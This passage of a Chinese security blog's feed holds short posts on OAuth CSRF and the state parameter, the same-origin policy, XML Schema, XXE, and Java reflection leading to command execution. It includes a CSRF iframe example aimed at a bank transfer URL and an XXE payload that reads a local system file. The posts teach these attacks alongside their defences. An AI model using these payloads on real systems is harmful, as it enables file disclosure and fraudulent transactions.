于是乎，攻击者就能使用移花接木的手段，提前准备一个含有自己的Authorization Code的请求，并让受害者的浏览器来接着完成后续的令牌申请流程。(知乎转载)</p></blockquote><ol><li>详细分析</li></ol><p>回顾一下上面简单总结的第四步：</p><blockquote><p>用户A的浏览器得到一个302的回复，然后重定向到网站B指定redirect_uri，网站B从而得到了code，然后网站B拿着 code 和能够标识个人身份的 “client_id “,client_secret“ 去拜访 github，拿到access_token，这里的“client_id “,client_secret“ 是Github判断这个请求的合法性依据，”,client_secret“这个是网站B独有的。</p></blockquote><p>这里面有个问题就是用户A的浏览器根据302状态码把code redirect到网站B,这个code是和将要登录网站B的账号关联的，如果攻击者替换了用户A这个请求，把里面的code换成攻击者账号的，然后网站B继续完成OAuth的认证流程，这会造成用户A在网站B的账号和攻击者的GitHub账号绑定了，攻击者只要在网站B通过GitHub登录就能成功登录用户A在网站B的账号了。<strong>因此这个漏洞本质是欺骗网站B</strong></p><p><img src="/images/CSRF OAuth.jpg" alt="攻击图"></p><ol><li>攻击成功条件</li></ol><ul><li>用户A的User Session是valid的</li><li>OAuth2提供者颁发的Authorization Code有效期很短，OAuth2官方推荐的时间是不大于10分钟，所以要快</li><li>一个Authorization Code只能被使用一次</li></ul><h1 id="0x03-如何防御"><a href="#0x03-如何防御" class="headerlink" title="0x03 如何防御"></a>0x03 如何防御</h1><p>刚才提到了，既然这个漏洞本质是欺骗网站B，那么要做防御的当然在网站B了，网站B要确保用户发去GitHub的授权码(Authorization Code)申请和用户redirect回来的授权码是一致的，怎么做呢？就是加一个唯一的，随机的参数state来确保唯一性</p><ul><li>首先，网站B redirect 用户A到GitHub申请授权码的时候带上”state=xyz“参数</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET /authorize?response_type=code&amp;client_id=s6BhdRkqt3&amp;state=xyz</span><br><span class="line">        &amp;redirect_uri=https%3A%2F%2Fclient%2Eexample%2Ecom%2Fcb HTTP/1.1</span><br><span class="line">Host: server.example.com</span><br></pre></td></tr></table></figure><ul><li>然后，用户A的浏览器收到GitHub发来的302带着授权码redirect回到B网站时，GitHub会根据申请code时的请求在302的location中带上”state=xyz“</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 302 Found</span><br><span class="line">Location: https://B.com/cb?code=SplxlOBeZQQYbYS6WxSbIA</span><br><span class="line">          &amp;state=xyz</span><br></pre></td></tr></table></figure><ul><li><p>这样网站B就可以根据state参数确认这个code对应哪一个用户了</p></li><li><p>要避免遭受本文提到的CSRF攻击问题，需要第三方应用正确的使用state参数</p></li></ul><h1 id="Refer-link"><a href="#Refer-link" class="headerlink" title="Refer link"></a>Refer link</h1><p><a href="http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html</a></p><p><a href="https://aaronparecki.com/oauth-2-simplified/" target="_blank" rel="noopener">https://aaronparecki.com/oauth-2-simplified/</a></p><p><a href="https://www.zhihu.com/question/19781476" target="_blank" rel="noopener">https://www.zhihu.com/question/19781476</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;最近OAuth又出了一个漏洞，根据漏洞介绍这个漏洞不在OAuth协议，而在用户的部署上，等详细分析吧
      
    
    </summary>
    
    
      <category term="Web security" scheme="http://yoursite.com/tags/Web-security/"/>
    
  </entry>
  
  <entry>
    <title>Same-Origin Protection (SOP)</title>
    <link href="http://yoursite.com/2018/02/09/Same-Origin-Protection-SOP/"/>
    <id>http://yoursite.com/2018/02/09/Same-Origin-Protection-SOP/</id>
    <published>2018-02-09T10:39:27.000Z</published>
    <updated>2018-02-28T03:46:05.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-什么是同源策略-SOP"><a href="#0x00-什么是同源策略-SOP" class="headerlink" title="0x00 什么是同源策略(SOP)"></a>0x00 什么是同源策略(SOP)</h1><p>在Web安全中，SOP是一个非常重要安全策略，必须要弄懂才能对很多攻击有更加清晰的理解，那什么是同源策略呢？下面是我本人的理解：</p><p><strong>同源策略是一个浏览器中内建的安全策略，它确保不同源的网站不能互相作用或者互相交换。</strong></p><ul><li><p>不同源指的是协议(https,http,ftp…),不同端口(80,443,22,21),不同域名。</p></li><li><p>不能互相作用或者互相交换是指：A网站即使和B网站不同源，但仍然可以发送request到B网站，这个请求在B网站还是会处理的，但A网站不能读取response，总结一句就是：跨域请求是可以发去的，但是请求响应response被浏览器堵塞了，所以说同源策略是限制了不同源的读，但不限制不同源的写</p></li><li><p>由于同源策略的限制，跨域的ajax请求不会带cookie，然而script/iframe/img等标签却是支持跨域的，所以在请求的时候是会带上cookie的，这使得CSRF攻击有可乘之机</p></li></ul><h1 id="0x01-CSRF攻击"><a href="#0x01-CSRF攻击" class="headerlink" title="0x01 CSRF攻击"></a>0x01 CSRF攻击</h1><ul><li>由于同源策略的限制，跨域的ajax请求不会带cookie，然而script/iframe/img等标签却是支持跨域的，所以在请求的时候是会带上cookie的。如果用户登陆了Abank.com，那么cookie里面就有了tocken，同时又打开了另外一个标签页访问了evil.com，这个网页里面有一个iframe:</li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://Abank.com/app/transferFunds?amount=1500&amp;destinationAccount="</span><span class="attr">attackeraccountnumber</span>" &gt;</span></span><br></pre></td></tr></table></figure><ul><li>防CSRF攻击的策略就是将token添加到请求的参数里面，也就是说每个需要验证身份的请求都要显式地带上token值,目的就是让请求不可预知，就算攻击者得到了你的登录token，也没有办法构造转账的请求，因为转账的请求带有一个不可预知的，随机的token作为保护，当然也可以加入一些人机交换，例如验证码之类的</li></ul><h1 id="0x02-Cross-domain-和-Silverlight-的跨越配置文件"><a href="#0x02-Cross-domain-和-Silverlight-的跨越配置文件" class="headerlink" title="0x02 Cross-domain 和 Silverlight 的跨越配置文件"></a>0x02 Cross-domain 和 Silverlight 的跨越配置文件</h1><p>这两个配置文件必须设置严格，防止不必要跨域</p><h1 id="Refer-link"><a href="#Refer-link" class="headerlink" title="Refer link"></a>Refer link</h1><p><a href="https://www.gracefulsecurity.com/cross-domain-flash-and-silverlight-crossdomain-xml/" target="_blank" rel="noopener">https://www.gracefulsecurity.com/cross-domain-flash-and-silverlight-crossdomain-xml/</a></p><p><a href="https://www.gracefulsecurity.com/what-is-cross-site-request-forgery/" target="_blank" rel="noopener">https://www.gracefulsecurity.com/what-is-cross-site-request-forgery/</a></p><p><a href="http://www.veracode.com/security/csrf" target="_blank" rel="noopener">http://www.veracode.com/security/csrf</a></p><p><a href="http://yincheng.site/cross-domain" target="_blank" rel="noopener">http://yincheng.site/cross-domain</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x00-什么是同源策略-SOP&quot;&gt;&lt;a href=&quot;#0x00-什么是同源策略-SOP&quot; class=&quot;headerlink&quot; title=&quot;0x00 什么是同源策略(SOP)&quot;&gt;&lt;/a&gt;0x00 什么是同源策略(SOP)&lt;/h1&gt;&lt;p&gt;在Web安全中，SOP是
      
    
    </summary>
    
    
      <category term="Web security" scheme="http://yoursite.com/tags/Web-security/"/>
    
  </entry>
  
  <entry>
    <title>XXE 攻击(2)</title>
    <link href="http://yoursite.com/2018/02/08/XXE-%E6%94%BB%E5%87%BB%E2%80%94%E2%80%942/"/>
    <id>http://yoursite.com/2018/02/08/XXE-攻击——2/</id>
    <published>2018-02-07T20:57:37.000Z</published>
    <updated>2018-02-28T03:46:31.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在上一遍文章中提到了XML的格式定义DTD存在外部实体引用攻击，这次来学习一下主流的XML格式定义XML Schema，刚好最近上了java的spring培训，里面定义beans的时候主要配置的就是XML文档，所以也是时候再学学xml的相关知识了，网上很多相关文章，主要记录一些和安全相关的设置吧</p><h1 id="0x01-XML-Schema-基础"><a href="#0x01-XML-Schema-基础" class="headerlink" title="0x01 XML Schema 基础"></a>0x01 XML Schema 基础</h1><p>XML Schema 描述了 XML文档的结构，也是由 XML 编写，其中Schema可以理解为约束、概要，但不推荐使用中文进行记忆，Schema就是Schema</p><ul><li>一个普通的xml文档：</li></ul><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">&lt;?xml version="1.0"?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don't forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>一个XML Schema定义</li></ul><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">&lt;?xml version="1.0"?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">xs:schema</span> <span class="attr">xmlns:xs</span>=<span class="string">"http://www.w3.org/2001/XMLSchema"</span></span></span><br><span class="line"><span class="tag"><span class="attr">targetNamespace</span>=<span class="string">"http://www.w3schools.com"</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns</span>=<span class="string">"http://www.w3schools.com"</span></span></span><br><span class="line"><span class="tag"><span class="attr">elementFormDefault</span>=<span class="string">"qualified"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xs:element</span> <span class="attr">name</span>=<span class="string">"note"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">xs:complexType</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xs:sequence</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">xs:element</span> <span class="attr">name</span>=<span class="string">"to"</span> <span class="attr">type</span>=<span class="string">"xs:string"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">xs:element</span> <span class="attr">name</span>=<span class="string">"from"</span> <span class="attr">type</span>=<span class="string">"xs:string"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">xs:element</span> <span class="attr">name</span>=<span class="string">"heading"</span> <span class="attr">type</span>=<span class="string">"xs:string"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">xs:element</span> <span class="attr">name</span>=<span class="string">"body"</span> <span class="attr">type</span>=<span class="string">"xs:string"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xs:sequence</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">xs:complexType</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xs:element</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">xs:schema</span>&gt;</span></span><br></pre></td></tr></table></figure><ol><li>第一句代表xml版本号，1.0版本</li><li><xs:schema> </xs:schema> schema的根元素</li><li>xmlns:xs=”<a href="http://www.w3.org/2001/XMLSchema" target="_blank" rel="noopener">http://www.w3.org/2001/XMLSchema</a>“ 代表schema 中用到的元素和数据类型来自命名空间 “<a href="http://www.w3.org/2001/XMLSchema&quot;。同时它还规定了来自命名空间" target="_blank" rel="noopener">http://www.w3.org/2001/XMLSchema&quot;。同时它还规定了来自命名空间</a> “<a href="http://www.w3.org/2001/XMLSchema" target="_blank" rel="noopener">http://www.w3.org/2001/XMLSchema</a>“ 的元素和数据类型应该使用前缀 xs：</li><li>targetNamespace=”<a href="http://www.runoob.com" target="_blank" rel="noopener">http://www.runoob.com</a>“ 显示被此 schema 定义的元素 (note, to, from, heading, body) 来自命名空间： “<a href="http://www.runoob.com&quot;。" target="_blank" rel="noopener">http://www.runoob.com&quot;。</a></li><li>xmlns=”<a href="http://www.runoob.com" target="_blank" rel="noopener">http://www.runoob.com</a>“ xmlns=”<a href="http://www.runoob.com" target="_blank" rel="noopener">http://www.runoob.com</a>“</li><li>elementFormDefault=”qualified” 指出任何 XML 实例文档所使用的且在此 schema 中声明过的元素必须被命名空间限定。</li><li>后面是各种元素定义，数据类型定义等</li></ol><p>详细的关于XML Schema定义可以参考下面的链接</p><p><a href="http://www.runoob.com/schema/schema-schema.html" target="_blank" rel="noopener">http://www.runoob.com/schema/schema-schema.html</a></p><ul><li>xml文档引用上面定义的Schema:note.xsd(这是重点要理解的)</li></ul><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">&lt;?xml version="1.0"?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">note</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns</span>=<span class="string">"http://www.w3schools.com"</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag"><span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.w3schools.com note.xsd"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don't forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><ol><li>xmlns=”<a href="http://www.w3schools.com" target="_blank" rel="noopener">http://www.w3schools.com</a>“ 定义了默认的命名空间，如果没有定义其他的命名空间，XML 文档会使用这个作为schema 验证器</li><li>xmlns:xsi=”<a href="http://www.w3.org/2001/XMLSchema-instance" target="_blank" rel="noopener">http://www.w3.org/2001/XMLSchema-instance</a>“ 定义了一个指定的命名空间，并把这个空间 alias - xsi(别名)</li><li>xsi:schemaLocation=”<a href="http://www.w3schools.com" target="_blank" rel="noopener">http://www.w3schools.com</a> note.xsd”&gt; 定义了xsi的schemaLocation属性，格式为：namespace and XSD-location-URI，中间用换行符或者空格作为分隔符</li></ol><p>下来来自stackoverflow的详细解释，好明白的讲解：</p><p><a href="https://stackoverflow.com/questions/34202967/xmlns-xmlnsxsi-xsischemalocation-and-targetnamespace" target="_blank" rel="noopener">https://stackoverflow.com/questions/34202967/xmlns-xmlnsxsi-xsischemalocation-and-targetnamespace</a></p><h1 id="0x02-XML-Schema攻击的分类"><a href="#0x02-XML-Schema攻击的分类" class="headerlink" title="0x02 XML Schema攻击的分类"></a>0x02 XML Schema攻击的分类</h1><p>XML Schema攻击分为,下面的没有怎么研究，希望日后可以补充，都是看家人的总结来的</p><p>1.schemaLocation</p><p>2.noNamespaceSchemaLocation</p><p>3.XInclude。</p><p>4.XSLT 攻击</p><p>refer link</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzIwNDI4MzAwOA==&amp;mid=2650524176&amp;idx=1&amp;sn=e1f8ebb128ae248d69e2947e4ac9bcf2&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzIwNDI4MzAwOA==&amp;mid=2650524176&amp;idx=1&amp;sn=e1f8ebb128ae248d69e2947e4ac9bcf2&amp;scene=21#wechat_redirect</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;在上一遍文章中提到了XML的格式定义DTD存在外部实体引用攻击，这次来学习一下主流的XML格式定义X
      
    
    </summary>
    
    
      <category term="Web security" scheme="http://yoursite.com/tags/Web-security/"/>
    
  </entry>
  
  <entry>
    <title>XXE 攻击</title>
    <link href="http://yoursite.com/2018/02/06/XXE-%E6%94%BB%E5%87%BB/"/>
    <id>http://yoursite.com/2018/02/06/XXE-攻击/</id>
    <published>2018-02-06T11:14:30.000Z</published>
    <updated>2018-02-28T03:47:20.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-什么是-XXE"><a href="#0x00-什么是-XXE" class="headerlink" title="0x00 什么是 XXE"></a>0x00 什么是 XXE</h1><p>XXE：XML External Entity，即外部实体攻击,其本质是利用应用过滤不严格进行xml语句的注入攻击，感觉应该属于注入攻击的一种，</p><h1 id="0x01-XML-文档的DTD"><a href="#0x01-XML-文档的DTD" class="headerlink" title="0x01 XML 文档的DTD"></a>0x01 XML 文档的DTD</h1><p>文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构，包括定义了XML文档的元素(!ELEMENT)，属性(!ATTLIST)，实体(!ENTITY),<strong>其中实体的定义为：实体是用于定义引用普通文本或特殊字符的快捷方式的变量。类似于定义了一个变量</strong></p><p>详细的DTD定义可以参考下面的链接：</p><p><a href="http://www.runoob.com/dtd/dtd-building.html" target="_blank" rel="noopener">http://www.runoob.com/dtd/dtd-building.html</a></p><h1 id="x03-内部实体和外部实体"><a href="#x03-内部实体和外部实体" class="headerlink" title="x03 内部实体和外部实体"></a>x03 内部实体和外部实体</h1><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">DTD 定义内部实体</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">writer</span> "<span class="attr">Donald</span> <span class="attr">Duck.</span>"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">copyright</span> "<span class="attr">Copyright</span> <span class="attr">runoob.com</span>"&gt;</span></span><br><span class="line"></span><br><span class="line">XML引用上面实体的内部定义：</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span>&amp;writer;&amp;copyright;<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">DTD 定义外部实体，加了一个SYSTEM关键字</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">writer</span> <span class="attr">SYSTEM</span> "<span class="attr">http:</span>//<span class="attr">www.runoob.com</span>/<span class="attr">entities.dtd</span>"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">copyright</span> <span class="attr">SYSTEM</span> "<span class="attr">http:</span>//<span class="attr">www.runoob.com</span>/<span class="attr">entities.dtd</span>"&gt;</span></span><br><span class="line"></span><br><span class="line">XML引用上面定义的外部实体</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span>&amp;writer;&amp;copyright;<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="0x02-XXE-攻击PAYLOAD"><a href="#0x02-XXE-攻击PAYLOAD" class="headerlink" title="0x02 XXE 攻击PAYLOAD"></a>0x02 XXE 攻击PAYLOAD</h1><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE foo [</span></span><br><span class="line"><span class="meta">    &lt;!ELEMENT foo ANY &gt;</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY  xxe SYSTEM "file:///c:/windows/win.ini" &gt; #定义了外部实体引用</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">foo</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="0x02-XXE攻击原理"><a href="#0x02-XXE攻击原理" class="headerlink" title="0x02 XXE攻击原理"></a>0x02 XXE攻击原理</h1><p>在 XML1.0 标准里，XML文档里的实体的标识符可以访问本地远程内容，如果在外部实体引用的过程中，注入恶意代码，即可引发信息泄露等安全问题。</p><p>比如上述示例中所演示的 URI，即可读取 passwd 中的敏感信息。</p><h1 id="0x03-攻击方式"><a href="#0x03-攻击方式" class="headerlink" title="0x03 攻击方式"></a>0x03 攻击方式</h1><ul><li><p>有回显</p></li><li><p>无回显</p></li></ul><p>具体就不继续了，网上一大堆文章，反正了解了核心概念就可以了，其他利用姿势自行Google</p><h1 id="0x04-如何防御"><a href="#0x04-如何防御" class="headerlink" title="0x04 如何防御"></a>0x04 如何防御</h1><p>可以将 libxml 版本升级到 2.9.0 以后，因为 libxml 2.9.0 以后默认是不解析外部实体的，还要做输入过滤，错误处理等，反正应对注入的措施都要有</p><h1 id="Bonus"><a href="#Bonus" class="headerlink" title="Bonus"></a>Bonus</h1><p>XML Schema 很快会将 DTD 取而代之，但 XML Schema 也会存在注入的问题，这个后面再慢慢看，还有Xpath注入等，关于xml的安全问题还是由很多的</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="http://mp.weixin.qq.com/s/vkCdz6YCoiiJPI30KePD6g" target="_blank" rel="noopener">http://mp.weixin.qq.com/s/vkCdz6YCoiiJPI30KePD6g</a></p><p><a href="http://www.runoob.com/dtd/dtd-summary.html" target="_blank" rel="noopener">http://www.runoob.com/dtd/dtd-summary.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x00-什么是-XXE&quot;&gt;&lt;a href=&quot;#0x00-什么是-XXE&quot; class=&quot;headerlink&quot; title=&quot;0x00 什么是 XXE&quot;&gt;&lt;/a&gt;0x00 什么是 XXE&lt;/h1&gt;&lt;p&gt;XXE：XML External Entity，即外部实体攻
      
    
    </summary>
    
    
      <category term="Web security" scheme="http://yoursite.com/tags/Web-security/"/>
    
  </entry>
  
  <entry>
    <title>Jekins security related</title>
    <link href="http://yoursite.com/2018/02/05/Jekins-security-related-doc/"/>
    <id>http://yoursite.com/2018/02/05/Jekins-security-related-doc/</id>
    <published>2018-02-05T15:08:20.000Z</published>
    <updated>2018-02-05T07:11:57.000Z</updated>
    
    <content type="html"><![CDATA[<p>一些Jekins安全配置和漏洞的文章：</p><p><a href="https://www.blackhat.com/docs/eu-15/materials/eu-15-Mittal-Continuous-Intrusion-Why-CI-Tools-Are-An-Attackers-Best-Friend.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/eu-15/materials/eu-15-Mittal-Continuous-Intrusion-Why-CI-Tools-Are-An-Attackers-Best-Friend.pdf</a></p><p><a href="https://www.sans.org/reading-room/whitepapers/bestprac/securing-jenkins-ci-systems-36872" target="_blank" rel="noopener">https://www.sans.org/reading-room/whitepapers/bestprac/securing-jenkins-ci-systems-36872</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;一些Jekins安全配置和漏洞的文章：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.blackhat.com/docs/eu-15/materials/eu-15-Mittal-Continuous-Intrusion-Why-CI-Tools-Are-An-A
      
    
    </summary>
    
    
      <category term="Jekins" scheme="http://yoursite.com/tags/Jekins/"/>
    
  </entry>
  
  <entry>
    <title>Java由反射到命令执行</title>
    <link href="http://yoursite.com/2018/02/01/Java%E7%94%B1%E5%8F%8D%E5%B0%84%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>http://yoursite.com/2018/02/01/Java由反射到命令执行/</id>
    <published>2018-01-31T17:26:50.000Z</published>
    <updated>2018-02-01T09:55:53.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-什么是Java反射和应用场景"><a href="#1-什么是Java反射和应用场景" class="headerlink" title="1 什么是Java反射和应用场景"></a>1 什么是Java反射和应用场景</h1><ul><li>详细的反射教程可以参考下面的链接，讲得超级详细，简单讲就是在程序运行时动态获得类的属性和方法，并可以动态创建对象</li></ul><p><a href="http://www.sczyh30.com/posts/Java/java-reflection-1/#%E4%B8%80%E3%80%81%E5%9B%9E%E9%A1%BE%EF%BC%9A%E4%BB%80%E4%B9%88%E6%98%AF%E5%8F%8D%E5%B0%84%EF%BC%9F" target="_blank" rel="noopener">关于反射的详解教程请点我</a></p><ul><li>应用场景</li></ul><blockquote><p>当我们在使用IDE(如Eclipse，IDEA)时，当我们输入一个对象或类并想调用它的属性或方法时，一按点号，编译器就会自动列出它的属性或方法，这里就会用到反射。反射最重要的用途就是开发各种通用框架。<br>很多框架（比如Spring）都是配置化的（比如通过XML文件配置JavaBean,Action之类的），为了保证框架的通用性，它们可能需要根据配置文件加载不同的对象或类，调用不同的方法，这个时候就必须用到反射——运行时动态加载需要加载的对象。</p></blockquote><ul><li>简单介绍几个主要方法，详解的用法可以参考我上面给的链接</li></ul><ol><li>加载类，得到指定类的Class对象</li></ol><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"com.yano.reflect.Consumer"</span>);</span><br><span class="line">Class clazz1 = <span class="keyword">new</span> Consumer().getClass();</span><br><span class="line">Class class2 = Person.class;</span><br></pre></td></tr></table></figure><ol><li>创建实例</li></ol><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">方法一：</span><br><span class="line">Class&lt;?&gt; c = String.class;</span><br><span class="line">Object str = c.newInstance();</span><br><span class="line">方法二：</span><br><span class="line"><span class="comment">//获取String所对应的Class对象</span></span><br><span class="line">Class&lt;?&gt; c = String.class;</span><br><span class="line"><span class="comment">//获取String类带一个String参数的构造器</span></span><br><span class="line">Constructor constructor = c.getConstructor(String.class);</span><br><span class="line"><span class="comment">//根据构造器创建实例</span></span><br><span class="line">Object obj = constructor.newInstance(<span class="string">"23333"</span>);</span><br><span class="line">System.out.println(obj);</span><br></pre></td></tr></table></figure><ol><li>获取方法</li></ol><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">getMethod方法返回一个特定的方法，其中第一个参数为方法名称，后面的参数为方法的参数对应Class的对象</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Method <span class="title">getMethod</span><span class="params">(String name, Class&lt;?&gt;... parameterTypes)</span></span></span><br></pre></td></tr></table></figure><h1 id="2-Java的命令执行类："><a href="#2-Java的命令执行类：" class="headerlink" title="2 Java的命令执行类："></a>2 Java的命令执行类：</h1><ul><li>java.lang.Runtime类,下面是官方文档解释</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class Runtime extends Object</span><br><span class="line"></span><br><span class="line">Every Java application has a single instance of class Runtime that allows the application to interface with the environment in which the application is running. The current runtime can be obtained from the getRuntime method.</span><br><span class="line">An application cannot create its own instance of this class.</span><br></pre></td></tr></table></figure><ul><li>其中主要的方法是：getRuntime(),得到一个和当前程序相关联的Runtime类的对象，文档解释如下：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static Runtime getRuntime()</span><br><span class="line">Returns the runtime object associated with the current Java application. Most of the methods of class Runtime are instance methods and must be invoked with respect to the current runtime object.</span><br><span class="line">Returns:</span><br><span class="line">the Runtime object associated with the current Java application.</span><br></pre></td></tr></table></figure><ul><li>这个Runtime对象再调用exec()方法执行命令，详细文档解释如下：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public Process exec(String command)</span><br><span class="line">             throws IOException</span><br><span class="line">Executes the specified string command in a separate process.</span><br><span class="line">This is a convenience method. An invocation of the form exec(command) behaves in exactly the same way as the invocation exec(command, null, null).</span><br></pre></td></tr></table></figure><ul><li>最后综合使用,在我的mac打开了计算器程序</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, IllegalAccessException, InstantiationException, IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"open /Applications/Calculator.app/"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="3-命令执行漏洞的实现，如何取得Runtime类是关键，其中一种常用方式就是通过反射"><a href="#3-命令执行漏洞的实现，如何取得Runtime类是关键，其中一种常用方式就是通过反射" class="headerlink" title="3 命令执行漏洞的实现，如何取得Runtime类是关键，其中一种常用方式就是通过反射"></a>3 命令执行漏洞的实现，如何取得Runtime类是关键，其中一种常用方式就是通过反射</h1><ol><li>场景一 Android API17 前的Webview加了addJavascriptInterface()方法，映射了一个Java对象到js中</li></ol><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WebAppInterface</span> </span>&#123;</span><br><span class="line">    Context mContext;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Instantiate the interface and set the context */</span></span><br><span class="line">    WebAppInterface(Context c) &#123;</span><br><span class="line">        mContext = c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*Show a toast from the web page */</span></span><br><span class="line">    <span class="comment">/*@JavascriptInterface  